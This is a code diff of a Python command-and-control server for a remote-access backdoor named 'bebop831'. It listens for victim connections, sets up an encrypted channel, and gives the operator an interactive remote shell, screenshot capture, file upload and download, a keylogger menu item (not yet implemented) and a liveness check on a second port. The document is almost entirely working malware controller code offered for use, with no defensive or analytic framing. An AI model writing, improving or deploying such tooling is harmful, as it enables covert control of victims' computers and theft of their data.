@@ -1,197 +1,274 @@
-import base64
-import socket
-import sys
-import time
-import os
-import base64
-import rsa
-from rsa import PublicKey
+import socket, select, time, rsa, os, threading, readline as _
 from cryptography.fernet import Fernet
 
 address = ("0.0.0.0", 3000)
-script_cwd = os.getcwd()
-device_info = ""
 authed = False
+input_buff = ""    
+
+#Connection and data transfer functions
+def establish_connection(address, time_out=None):
+    global conn_to_client, authed, lck, device_info    
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.settimeout(time_out)
+
+    print(f"[+] listening for connection on {socket.gethostbyname(os.uname().nodename)}:{address[1]}")
+    while not authed: 
+        try:
+            server.bind(address)
+            server.listen(0)
+            conn_to_client, client_addr = server.accept()
+
+            if conn_to_client:
+                client_key_buff = recv(sock=conn_to_client, is_authed=authed)
+                client_key = rsa.PublicKey.load_pkcs1(client_key_buff, 'PEM')
+
+                key = Fernet.generate_key()
+                send(rsa.encrypt(key, client_key), sock=conn_to_client, is_authed=authed)
+
+                lck = Fernet(key)
+
+                encr_buff = recv(sock=conn_to_client, is_authed=authed)
+                if encr_buff:
+                    device_info_buff = decrypt(encr_buff).decode()
+                    parse_sys_info(device_info_buff)
+                    authed = True
+                    print(f"[+] Established Secure Connection to {client_addr[0]}:{client_addr[1]}\n\n")
+                    return conn_to_client
+                else:
+                    return None
+
+        except socket.timeout:
+            print("Connection request timed out. Could not connect...")
+            return None
+
+        except OSError as os_err:
+            if os_err.errno == 48:
+                continue
+            close_connection(conn_to_client)
 
 
+def recv(time_out=None, sock=None, is_authed=None, buff_size=1024):
+    sock.settimeout(time_out)
+    data_size = sock.recv(12)
+    if not data_size:
+        return None
+
+    data_buff = bytes()
+    data_size = int(data_size)
+    while len(data_buff) < data_size:
+        data_buff += sock.recv(buff_size)
+
+    sock.settimeout(None)
+    return decrypt(data_buff) if is_authed else data_buff
+
+
+def send(data, sock=None, is_authed=None, header_size=12):
+    if not data:
+         return
+
+    if is_authed:
+        data = encrypt(data)
+    data_size = f"{len(data):<{header_size}}"
+    sock.sendall(data_size.encode()+data)
+
+
+def encrypt(data):
+    return lck.encrypt(data)
+
+
+def decrypt(encrypted_data):
+    return lck.decrypt(encrypted_data)
+
+
+def close_connection(sock):
+    global conn_to_client, authed
+    print("\n\nClosing current connection...")
+    authed = False
+    if sock:
+        sock.close()
+
+
+def reset_connection(time_out, sock_to_close=None, address=address):
+    close_connection(sock=sock_to_close)
+    print("Reseting current connection...")
+    return establish_connection(address, time_out=time_out)
+
+def poll_connection():
+        global conn_to_client
+        if not conn_to_client:
+            return
+            
+        poll_obj = select.poll()
+        poll_obj.register(conn_to_client)
+        while True:
+            event = poll_obj.poll()[0]
+            if event[1] == 19: 
+                print("\nConnection lost...")
+                conn_to_client = reset_connection(time_out=15)
+                break
+
+            elif event[1] == 32:
+                #KeyboardInterrupt
+                break
+
+
+
+def is_alive():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            while True:
+                try:
+                    s.bind(("0.0.0.0", 4001))
+                    s.listen()
+                    client, _ = s.accept()
+                    buff = recv(time_out=86400, sock=client, is_authed=authed)
+                    from base64 import b64decode
+                    if b64decode(buff) == b"ALIVE":
+                        break
+                except socket.timeout:
+                    print("bebop831 backdoor is unavailable...")
+                    
+                except OSError as os_err:
+                    if os_err.errno == 48:
+                        continue
+                    else:
+                        print(os_err)
+                
+
+
+
+# Backdoor specific functions
 def print_menu():
+    print(f"\n{device_info}")
+    
     print("\n/-------BEBOP-------/\n")
     print("1.) Open shell")
     print("2.) Take screenshot")
     print("3.) Keylogger")
     print("4.) Exit\n\n")
 
-def get_device_info():
-    device_info = recv()
-    return f"\n\n{device_info.decode()}\n\n"
+def clear_screen():
+    print('\033[H')
+    print('\033[2J')
 
-def recv(buff_size=1024):
-    data_buff = bytes()
-    data_size = conn_to_client.recv(12)
-    if len(data_size) > 0:
-        data_size = int(data_size.decode().rstrip())
-    else:
-        return None
-
-    while len(data_buff) < data_size:
-        data_buff += conn_to_client.recv(buff_size)
-
-    return decrypt(data_buff) if authed else data_buff
-
-def send(data, header_size=12):
-    if authed:
-        data = encrypt(data)
-    data_size = f"{len(data):<{header_size}}"
-    conn_to_client.sendall(data_size.encode()+data)
-
+def parse_sys_info(buff):
+    global device_info
+    device_info = ""
+    for line in buff.split("&"):
+        device_info += f"[+] {line}\n"
 
 def upload_file(file_name):
+    global conn_to_client, authed
     try:
         with open(f"{file_name}", "rb") as file:
             file_data = file.read()
-            send(file_data)
+            send(data=file_data, sock=conn_to_client, is_authed=authed)
+    except FileNotFoundError:
+            print(f"Error, {file_name} not found. Check path and try again.")
 
 
-    except OSError as e:
-        print(e)
-        send(b'')
-
-def download_file(file_name):
-    file_data = recv(buff_size=32768)
-    if not file_data:
-        print("Could not download file...")
-        return
-
+def download_file(file_name, buff_size=32768):
+    global conn_to_client, authed
     try:
-        file = open(f"{file_name}", "wb")
-        file.write(file_data)
-        file.close()
+        file_data = recv(buff_size=buff_size, time_out=15, sock=conn_to_client, is_authed=authed)
+        if file_data:
+            with open(f"{file_name}", "wb") as file:
+                file.write(file_data)
+                print(f"\nFile saved in {os.getcwd()}/{file_name}")
+        else:
+            print("Error, couldn't download the file.")
 
-    except OSError as e:
-        print(e)
-
+    except socket.timeout:
+        print("Could not download file. Connection timed out.")
+    
 
 def open_shell():
-    while True:
-        cmd = ""
-        try:
-            cmd = input("bebop#: ")
-        except KeyboardInterrupt:
-            choice = input("\n\nQuit the program? Y or n: ")
-            if choice.lower() == 'y' or choice.lower() == "yes":
-                break
+    global conn_to_client, authed
 
+    while True:
+        cmd = input("bebop831#: ")
         if cmd:
             if cmd == "exit":
-                send(cmd.encode())
+                send(sock=conn_to_client, is_authed=authed, data=cmd.encode()) 
                 break
 
+            if cmd == "clear":
+                clear_screen()
+                continue
+
             elif cmd[:2] == "dw":
-                #Download
                 print("Downloading...")
-                send(cmd.encode())
+                send(sock=conn_to_client, is_authed=authed, data=cmd.encode())
 
                 file_name = cmd[3:]
                 download_file(file_name)
 
             elif cmd[:2] == "up":
-                #Upload
                 print("Uploading...")
-                send(cmd.encode())
+                send(sock=conn_to_client, is_authed=authed, data=cmd.encode())
                 file_name = cmd[3:]
                 upload_file(file_name)
 
             else:
-                send(cmd.encode())
-                output = recv()
-                if output:
-                    try:
-                        output = output.decode() 
+                send(sock=conn_to_client, is_authed=authed, data=cmd.encode())
 
-                    except:
-                        print("Already in bytes")
-            
-                    finally:
+                try:
+                    output = recv(time_out=30, sock=conn_to_client, is_authed=authed)
+                    if output:
+                        output = output.decode() if output != b"%%NONE%%" else ""
                         print(output)
 
-def encrypt(data):
-    return lck.encrypt(data)
+                except socket.timeout:
+                    print("Process timed out...")
+                    continue
 
-def decrypt(encrypted_data):
-    return lck.decrypt(encrypted_data)
+def get_input(prompt):
+    global input_buff
+    while True:
+        input_buff = input(prompt)
 
-def establish_connection(address):
-    global conn_to_client, authed, lck
-
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind(address)
-    server.listen(0)
-
-    print("[+] Waiting on connections")
-    while not authed: 
-        conn_to_client, _ = server.accept()
-        if conn_to_client:
-            client_key_buff = recv()
-            client_key = PublicKey.load_pkcs1(client_key_buff, 'PEM')
-            
-            key = Fernet.generate_key()
-            send(rsa.encrypt(key, client_key))
-
-            lck = Fernet(key)
-            crypto = lck.decrypt(recv())
-            if crypto == b"\n\nOK\n\n":
-                authed = True
-            else:
-                kill_connection()
-
-        else:
-            kill_connection()
-            sys.exit("[+] Failed to establish secure connection to client...")
-
-def kill_connection():
-    conn_to_client.shutdown(socket.SHUT_WR)
-    conn_to_client.close()
-
+# Program entry
 def main():
-    establish_connection(address)
-    device_info = get_device_info()
-    
+    global conn_to_client, authed
+    conn_to_client = establish_connection(address, time_out=50)
+
+    poll = threading.Thread(target=poll_connection)
+    poll.start()
+
+    # keyboard = threading.Thread(target=get_input, args=("Enter Choice: ",))
+    # keyboard.start()
+
     while conn_to_client:
         try:
-            print(device_info)
             print_menu()
-            choice = input("Enter Choice: ")
-            send(choice.encode())
+            choice = input("Enter choice: ")
+            send(sock=conn_to_client, data=choice.encode(), is_authed=authed)
 
             if choice == "1":
                 open_shell()
 
             elif choice == "2":
                 print("\nTaking Screenshot...")
-                download_file(file_name=f"{time.asctime()}.png")
-                print(f"\nScreenshot saved in {script_cwd}/{time.asctime()}.png")
+                download_file(file_name=f"{time.asctime()}.png", buff_size=65538)
 
             elif choice == "3":
                 pass
+            elif choice.lower() == "clear":
+                clear_screen()
 
             elif choice == "4":
-                keep_alive = input("[+] Keep client alive? (Y or N): ")
-                print("[+] Keeping client alive..." if keep_alive.lower() == "y" or keep_alive == "yes" else "[+] Killing client connection...")
-                send(keep_alive.encode())
+                keep_alive = input("Keep client alive? Y or n: ").lower()
+                send(sock=conn_to_client, data=keep_alive.encode(), is_authed=authed)
                 break
-
-        except BrokenPipeError as bp:
-            print("Connection lost...")
-            print(bp)
-            break
-
         except KeyboardInterrupt:
-            choice = input("\n\nQuit the program? Y or n: ")
-            if choice.lower() == 'y' or choice.lower() == "yes":
-                break
-            
-        
-    kill_connection()
+            break
+        # except (ConnectionError, BrokenPipeError):
+        #     print("Connection lost, attempting to reconnect...")
+        #     conn_to_client = reset_connection(time_out=15)
+        #     continue
+
+    close_connection(conn_to_client)
+    poll.join()
+    print('Exiting...')
 
 
 main()
